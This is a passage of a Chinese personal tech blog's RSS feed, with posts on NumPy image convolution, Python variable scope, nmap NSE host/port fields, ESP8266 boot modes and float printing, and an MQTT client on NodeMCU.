-1 &amp; -1 &amp; 0 \\
-1 &amp; 0 &amp; 1 \\
0 &amp; 1 &amp; 1
\end{matrix}
\right]
$$
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/07/emboss.png?x-oss-process=style/png2jpg&#34; alt=&#34;浮雕&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;用numpy进行卷积计算&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%94%a8numpy%e8%bf%9b%e8%a1%8c%e5%8d%b7%e7%a7%af%e8%ae%a1%e7%ae%97&#34;&gt;
        ##
    &lt;/a&gt;
    用numpy进行卷积计算
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;以上的图片使用下面的算法生成，主要使用了numpy的array进行的计算。通过该算法生成的图片效果还不够理想：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;比如锐化及浮雕效果，锐化的边缘有些益处而其他部分亮度有些降低&lt;/li&gt;
&lt;li&gt;浮雕的效果感觉也不够明显&lt;/li&gt;
&lt;li&gt;程序执行速度有些慢&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    def convolution(self, kernel):
        &amp;#34;&amp;#34;&amp;#34;
        Create a new Image instance by applying the kernel
        &amp;#34;&amp;#34;&amp;#34;
        print &amp;#34;Run convolution transform&amp;#34;
        print &amp;#34;Start: %s&amp;#34; % time.ctime()

        k_height, k_width = kernel.shape
        n_width = self.width - k_width + 1
        n_height = self.height - k_height + 1

        if self.color_space == COLOR_SPACE_BW:
            new_img_data = np.zeros((n_height, n_width), dtype=self.img.dtype)
            channel_kernel = kernel
        elif self.color_space == COLOR_SPACE_RGB:
            new_img_data = np.zeros((n_height, n_width, 3), dtype=self.img.dtype)
            channel_kernel = np.zeros((k_height, k_width, 3))
            for c in range(3):
                channel_kernel[:,:,c] = kernel
        elif self.color_space == COLOR_SPACE_RGBA:
            # drop the alpha channel
            new_img_data = np.zeros((n_height, n_width, 3), dtype=self.img.dtype)
            channel_kernel = np.zeros((k_height, k_width, 3))
            for c in range(3):
                channel_kernel[:,:,c] = kernel
        else:
            print &amp;#34;Unknow color space&amp;#34;
            return None

        for y in range(n_height):
            for x in range(n_width):
                if self.color_space == COLOR_SPACE_RGBA:
                    new_img_data[y][x] = sum(sum(self.img[y:y+k_height, x:x+k_width,:3]*channel_kernel))
                else:
                    new_img_data[y][x] = sum(sum(self.img[y:y+k_height, x:x+k_width]*channel_kernel))

        imax = np.max(self.img)
        nmax = np.max(new_img_data)
        scale = 1.0*imax/nmax
        print &amp;#34;imax[{0}], nmax[{1}]&amp;#34;.format(imax, nmax)
        print &amp;#34;Scale:&amp;#34;, scale
        new_img_data = (new_img_data * scale).astype(self.img.dtype)

        print &amp;#34;End: %s&amp;#34; % time.ctime()

        new_image = Image()
        new_image.load_data(new_img_data)

        return new_image
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完整的程序可以在&lt;a href=&#34;https://github.com/singleye/MachineLearning/blob/master/convolution/convolution.py&#34;&gt;GitHub&lt;/a&gt;上找到。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>python中__main__的作用域及变量使用</title>
      <link>/2017/06/python%E4%B8%AD__main__%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%8F%8A%E5%8F%98%E9%87%8F%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Sat, 10 Jun 2017 23:00:31 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/06/python%E4%B8%AD__main__%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%8F%8A%E5%8F%98%E9%87%8F%E4%BD%BF%E7%94%A8/</guid>
      <description>&lt;p&gt;今天使用python写一段小程序时发现了一个容易忽略掉的变量作用域的细节。先看一下问题。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cat main_variable.py
x = 1

if __name__ == &amp;#34;__main__&amp;#34;:
    global x
    x = 2

$ python main_area.py
main_area.py:4: SyntaxWarning: name &amp;#39;x&amp;#39; is assigned to before global declaration
  global x
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;程序的本来目的是在对全局变量前使用global进行声明，但却引发了SyntaxWarning异常。问题原因其实也很简单，因为虽然使用&amp;rsquo;if &lt;strong&gt;name&lt;/strong&gt; == &amp;ldquo;&lt;strong&gt;main&lt;/strong&gt;&amp;quot;&amp;lsquo;进行判断后再执行，但代码还是处于整个文件的作用域中，因此并不需要使用global进行声明。&lt;/p&gt;
&lt;p&gt;因此程序可以有下面两种改法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;方法1:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cat main_variable.py
x = 1

if __name__ == &amp;#34;__main__&amp;#34;:
    x = 2

$ python main_area.py
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;方法2:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cat main_variable.py
x = 1

def main():
    global x
    x = 2

if __name__ == &amp;#34;__main__&amp;#34;:
    main()

$ python main_area.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写程序一定要注意细节啊！&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>nmap NSE脚本中host/port的内容</title>
      <link>/2017/06/nmap-nse%E8%84%9A%E6%9C%AC%E4%B8%ADhost/port%E7%9A%84%E5%86%85%E5%AE%B9/</link>
      <pubDate>Sun, 04 Jun 2017 21:12:03 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/06/nmap-nse%E8%84%9A%E6%9C%AC%E4%B8%ADhost/port%E7%9A%84%E5%86%85%E5%AE%B9/</guid>
      <description>&lt;p&gt;周末写了一个简单的nmap的NSE脚本，其中使用了nmap API中的host,port两个变量，数据结构记录。&lt;/p&gt;
&lt;p&gt;Host&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Key&lt;/th&gt;
&lt;th&gt;Value&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;registry&lt;/td&gt;
&lt;td&gt;table: 0x7feae1dc5080&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;name&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;reason_ttl&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;bin_ip&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ip&lt;/td&gt;
&lt;td&gt;192.168.1.10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;reason&lt;/td&gt;
&lt;td&gt;user-set&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;interface_mtu&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;times&lt;/td&gt;
&lt;td&gt;table: 0x7feae1d9dbf0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Key&lt;/th&gt;
&lt;th&gt;Value&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;number&lt;/td&gt;
&lt;td&gt;443&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;reason&lt;/td&gt;
&lt;td&gt;syn-ack&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;version&lt;/td&gt;
&lt;td&gt;table: 0x7feae1dfb720&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;state&lt;/td&gt;
&lt;td&gt;open&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;reason_ttl&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;service&lt;/td&gt;
&lt;td&gt;https&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;protocol&lt;/td&gt;
&lt;td&gt;tcp&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;a href=&#34;https://nmap.org/book/nse-api.html&#34;&gt;https://nmap.org/book/nse-api.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://nmap.org/docs/nmap-mindmap.pdf&#34;&gt;https://nmap.org/docs/nmap-mindmap.pdf&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>esp8266_sprint_float</title>
      <link>/2017/05/esp8266_sprint_float/</link>
      <pubDate>Fri, 12 May 2017 10:34:42 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/05/esp8266_sprint_float/</guid>
      <description>&lt;p&gt;用C语言进行字符串格式化操作的时候经常会使用sprintf/snprintf这两个函数，但这两天在使用Arduino IDE进行8266开发的时候却碰到了一个浮点数字符串打印小问题。&lt;/p&gt;
&lt;p&gt;问题代码&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  char buffer[128];
  float num = 1.0;
  
  ...
  
  memset(buffer, 0, sizeof(buffer));
  snprintf(buffer, sizeof(buffer), “%f”, num);
  Serial.println(buffer);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;实际运行并没有按照以往认为的方式将浮点数输出出来&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  snprintf(buffer, sizeof(buffer), &amp;#34;%d.&amp;#34;);
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>esp8266启动模式 - 如何理解&#39;rst cause:2, boot mode:(3,6)&#39;</title>
      <link>/2017/05/esp8266%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F-%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3rst-cause2-boot-mode36/</link>
      <pubDate>Mon, 08 May 2017 00:23:11 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/05/esp8266%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F-%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3rst-cause2-boot-mode36/</guid>
      <description>&lt;p&gt;8266模块启动或者出现问题后重启时会输出类似**&amp;lsquo;rst cause:2, boot mode:(3,6)&amp;rsquo;**的消息，这个模块的启动消息可以看出启动的原因和模式。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rst cause:2, boot mode:(3,6)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;rst-cause&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#rst-cause&#34;&gt;
        ##
    &lt;/a&gt;
    &amp;lsquo;rst cause&amp;rsquo;
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;**&amp;lsquo;rst cause&amp;rsquo;**含义如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;编号&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;unknown&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;normal boot&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;reset pin&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;software reset&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;watchdog reset&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;boot-mode&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#boot-mode&#34;&gt;
        ##
    &lt;/a&gt;
    &amp;lsquo;boot mode&amp;rsquo;
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;消息中内容的**&amp;lsquo;boot mode:(x,y)&amp;rsquo;&lt;strong&gt;中的&lt;/strong&gt;&amp;lsquo;x&amp;rsquo;**表示GPIO &amp;lsquo;15/0/2&amp;rsquo; 3个端口的二进制数（有电压为1，没电压为0）。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;启动模式 = ((GPIO15 &amp;lt;&amp;lt; 2) | (GPIO0 &amp;lt;&amp;lt; 1) | GPIO2);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于模块启动的时候会检查0/2/15端口的状态，理解这个数字的意义需要先了解模块的启动模式。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;启动模式&lt;/th&gt;
&lt;th&gt;GPIO15 (MTDO)&lt;/th&gt;
&lt;th&gt;GPIO0&lt;/th&gt;
&lt;th&gt;GPIO2&lt;/th&gt;
&lt;th&gt;启动模式&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;无效&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;Uart bootloader&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;无效&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;SPI flash (Boot sketch)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;SDIO&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;SDIO&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;0V&lt;/td&gt;
&lt;td&gt;SDIO&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;3.3V&lt;/td&gt;
&lt;td&gt;SDIO&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;参考资料&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99&#34;&gt;
        ##
    &lt;/a&gt;
    参考资料
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/esp8266/Arduino/blob/master/doc/boards.md#adafruit-huzzah-esp8266-esp-12&#34;&gt;https://github.com/esp8266/Arduino/blob/master/doc/boards.md#adafruit-huzzah-esp8266-esp-12&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/esp8266/esp8266-wiki/wiki/Boot-Process#esp-boot-modes&#34;&gt;https://github.com/esp8266/esp8266-wiki/wiki/Boot-Process#esp-boot-modes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>在ESP 8266 nodeMCU上运行MQTT</title>
      <link>/2017/05/%E5%9C%A8esp-8266-nodemcu%E4%B8%8A%E8%BF%90%E8%A1%8Cmqtt/</link>
      <pubDate>Sun, 07 May 2017 16:20:58 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/05/%E5%9C%A8esp-8266-nodemcu%E4%B8%8A%E8%BF%90%E8%A1%8Cmqtt/</guid>
      <description>&lt;p&gt;自动接触nodeMCU后发现8266是一个非常好的物联网开发Wi-Fi模块，因此就想把MQTT通讯协议在上面运行起来做些简单的事情。&lt;/p&gt;
&lt;h1 id=&#34;开发目标&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%bc%80%e5%8f%91%e7%9b%ae%e6%a0%87&#34;&gt;
        ##
    &lt;/a&gt;
    开发目标
&lt;/div&gt;
&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;将nodeMCU作为一个MQTT的客户端运行。&lt;/li&gt;
&lt;li&gt;使用PubSubClient这个MQTT协议实现。&lt;/li&gt;
&lt;li&gt;程序每次启动后先把将芯片设置到STA模式下，并连接指定的WI-FI路由器。&lt;/li&gt;
&lt;li&gt;连接建立好之后连接指定的MQTT服务器，并注册从服务器接收数据的topic，并定期将数据（uptime）发送到服务器端指定的topic上。
&lt;ul&gt;
&lt;li&gt;上传topic：&amp;ldquo;MAC地址/uplink&amp;rdquo;&lt;/li&gt;
&lt;li&gt;接收topic：&amp;ldquo;MAC地址/downlink&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;当收到downlink消息后把数据进行解析并执行，目前只支持&amp;rsquo;blink&amp;rsquo;命令。该命令可以把芯片上的LED灯按照指定的次数点亮的简单操作。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;程序开发&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%a8%8b%e5%ba%8f%e5%bc%80%e5%8f%91&#34;&gt;
        ##
    &lt;/a&gt;
    程序开发
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;程序启动设置&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%a8%8b%e5%ba%8f%e5%90%af%e5%8a%a8%e8%ae%be%e7%bd%ae&#34;&gt;
        #
    &lt;/a&gt;
    程序启动设置
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;程序启动的入口为&amp;rsquo;setup()&amp;lsquo;函数，这个函数做几件事情：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;设置LED控制PIN模式&lt;/li&gt;
&lt;li&gt;将WI-FI芯片设置到STA运行模式，并连接Wi-Fi路由器&lt;/li&gt;
&lt;li&gt;连接MQTT服务器，监听&amp;rsquo;downlink&amp;rsquo;消息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;程序片段解析：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void setup() {
  Serial.begin(BAUD_RATE);
  pinMode(LED_PIN, OUTPUT);  // 设置LED控制端口

  WiFi.disconnect();
  WiFi.mode(WIFI_STA);       // 设置启动为STA模式
  WiFi.setAutoConnect(true);
  WiFi.begin(wifi_ssid, wifi_pwd);  // 连接Wi-Fi路由器

  Serial.printf(&amp;#34;Connecting to AP(%s), password(%s)\n&amp;#34;, wifi_ssid, wifi_pwd);
  while (WL_CONNECTED != WiFi.status()) {
    Serial.print(&amp;#34;.&amp;#34;);
    blink(BLINK_SLOWLY);
  }
  Serial.printf(&amp;#34;\nWifi connection is setup!\n&amp;#34;);
  Serial.printf(&amp;#34;MAC: %s, IP: %s\n&amp;#34;, WiFi.macAddress().c_str(), WiFi.localIP().toString().c_str());

  while (!setup_mqtt_connection()) {   // 连接MQTT服务器
    Serial.print(&amp;#34;.&amp;#34;);
    blink(BLINK_SLOWLY);
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;连接mqtt服务器&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%bf%9e%e6%8e%a5mqtt%e6%9c%8d%e5%8a%a1%e5%99%a8&#34;&gt;
        #
    &lt;/a&gt;
    连接MQTT服务器
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;这个方法的工作就是建立连接并且注册接收的topic。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bool setup_mqtt_connection()
{
  char client_id[CLIENT_ID_LEN];

  snprintf(client_id, CLIENT_ID_LEN, &amp;#34;%s&amp;#34;, WiFi.macAddress().c_str());
  Serial.printf(&amp;#34;Client[%s] is connecting MQTT server!\n&amp;#34;, client_id);
  mqtt_connected = mq_client.connect(client_id);  // 连接MQTT服务器
  if (!mqtt_connected) {
    Serial.println(&amp;#34;MQTT connection failure&amp;#34;);
    return false;
  }

  mq_client.setCallback(mqtt_callback);  // 指定接收downlink消息的处理函数

  memset(uplink_topic, 0, TOPIC_LEN);
  snprintf(uplink_topic, TOPIC_LEN, &amp;#34;%s/uplink&amp;#34;, WiFi.macAddress().c_str());
  
  memset(downlink_topic, 0, TOPIC_LEN);
  snprintf(downlink_topic, TOPIC_LEN, &amp;#34;%s/downlink&amp;#34;, WiFi.macAddress().c_str());
  Serial.printf(&amp;#34;Subscribing to topic: %s\n&amp;#34;, downlink_topic);
  mqtt_connected = mq_client.subscribe(downlink_topic);  // 注册接收downlink消息
  if (!mqtt_connected) {
    Serial.println(&amp;#34;MQTT connection failure&amp;#34;);
    return false;
  }

  Serial.println(&amp;#34;MQTT connection is setup&amp;#34;);
  return true;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;接收消息处理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%8e%a5%e6%94%b6%e6%b6%88%e6%81%af%e5%a4%84%e7%90%86&#34;&gt;
        #
    &lt;/a&gt;
    接收消息处理
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;MQTT消息处理函数遵循PubSubClient的接口开发就行了。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void mqtt_callback(char *topic, uint8_t* buffer, unsigned int len) {
  blink(BLINK_QUICKLY);
  memset(recv_buffer, 0, RECV_BUFFER_LEN);
  strncpy(recv_buffer, (char *)buffer, (RECV_BUFFER_LEN&amp;lt;len ? RECV_BUFFER_LEN-1:len));
  Serial.printf(&amp;#34;Received [topic:%s]:%s\n&amp;#34;, topic, (char*)recv_buffer);
  parse_cmd((char *)recv_buffer);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但这里需要注意&amp;rsquo;len&amp;rsquo;这个参数的使用细节。&amp;rsquo;len&amp;rsquo;这个参数表明接收到的消息的实际长度，最好在处理函数中将数据复制出来后进行处理。最开始我没有这样处理，结果发现&amp;rsquo;buffer&amp;rsquo;中的数据会包含发出数据的信息，研究了一下源代码发现PubSubClient的发出／接收缓冲区是共用的，而且发出／接收后都不会重置。另外需要注意的是这个缓冲区并不大，默认为MQTT_MAX_PACKET_SIZE(128)个子节
。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;class PubSubClient {
   ...
   uint8_t buffer[MQTT_MAX_PACKET_SIZE];  // PubSubClient中的数据共用缓冲区
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;主循环&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%b8%bb%e5%be%aa%e7%8e%af&#34;&gt;
        #
    &lt;/a&gt;
    主循环
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;程序主循环的主要任务就是数据周期发送并处理MQTT消息接收&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void loop() {
  // send message every 10 second
  if (millis() - last_uplink_tick &amp;gt;= UPLINK_INTERVAL) {
    memset(send_buffer, 0, SEND_BUFFER_LEN);
    snprintf(send_buffer, SEND_BUFFER_LEN, &amp;#34;Client[%s@%s]: uptime:%ld&amp;#34;,
             WiFi.macAddress().c_str(),
             WiFi.localIP().toString().c_str(),
             millis());
    Serial.printf(&amp;#34;Sending: %s\n&amp;#34;, send_buffer);
    blink(BLINK_QUICKLY);
    mq_client.publish(uplink_topic, send_buffer);  // 发送数据到MQTT服务器
    last_uplink_tick = millis();
  }

  mq_client.loop();
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;使用方法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95&#34;&gt;
        ##
    &lt;/a&gt;
    使用方法
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;编译&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bc%96%e8%af%91&#34;&gt;
        #
    &lt;/a&gt;
    编译
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;我使用Arduino IDE进行开发，这是一个蛮不错的开发环境。不熟悉的人可以参考我另外一篇&lt;a href=&#34;http://www.singleye.net/2017/04/%E4%BD%BF%E7%94%A8arduino-ide%E8%BF%9B%E8%A1%8Cnodemcu%E5%BC%80%E5%8F%91/&#34;&gt;“使用Arduino IDE进行nodeMCU开发”&lt;/a&gt;的blog。&lt;/p&gt;
&lt;h2 id=&#34;运行&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%bf%90%e8%a1%8c&#34;&gt;
        #
    &lt;/a&gt;
    运行
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;nodemcu客户端&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#nodemcu%e5%ae%a2%e6%88%b7%e7%ab%af&#34;&gt;
        ##
    &lt;/a&gt;
    nodeMCU客户端
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;将程序烧入nodeMCU后每次只要通电程序就会自动运行。启动后程序有以下类似输出。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Connecting to AP(your_wifi_ssid), password(your_wifi_password)
....
Wifi connection is setup!
MAC: A0:20:A6:18:47:F1, IP: 192.168.102.102
Client[A0:20:A6:18:47:F1] is connecting MQTT server!
Subscribing to topic: A0:20:A6:18:47:F1/downlink
MQTT connection is setup
Sending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:21959   &amp;lt;-- 上传数据
Sending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:32036
Sending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:42077
Sending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:52160
Sending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:62233
Received [topic:A0:20:A6:18:47:F1/downlink]:#blink#3#      &amp;lt;-- 接收控制命令
Received [topic:A0:20:A6:18:47:F1/downlink]:bli     &amp;lt;-- 接收到非法命令
Received unknown command: bli
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;数据接收端&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%95%b0%e6%8d%ae%e6%8e%a5%e6%94%b6%e7%ab%af&#34;&gt;
        ##
    &lt;/a&gt;
    数据接收端
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;简单运行可以使用&amp;rsquo;mosquitto_sub&amp;rsquo;。命令可以参照下面的写法，需要用&amp;rsquo;-h&amp;rsquo;指定你的MQTT服务器地址，用&amp;rsquo;-t&amp;rsquo;指定接收的topic，这个topic会在nodeMCU每次运行时在串口输出，nodeMCU的MAC地址也会从串口输出。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mosquitto_sub -h &amp;#34;your_mqtt_server&amp;#34; -t &amp;#34;MAC_ADDRESS/uplink&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我直接是在MQTT服务器上运行数据接收端，因此我实际运行的命令如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ mosquitto_sub -t &amp;#34;A0:20:A6:18:47/uplink&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;远程控制端&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%bf%9c%e7%a8%8b%e6%8e%a7%e5%88%b6%e7%ab%af&#34;&gt;
        ##
    &lt;/a&gt;
    远程控制端
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;可以使用&amp;rsquo;mosquitto_pub&amp;rsquo;进行远程数据发送实现对nodeMCU的控制。下面的例子可以把LED连续点亮3次。&lt;/p&gt;
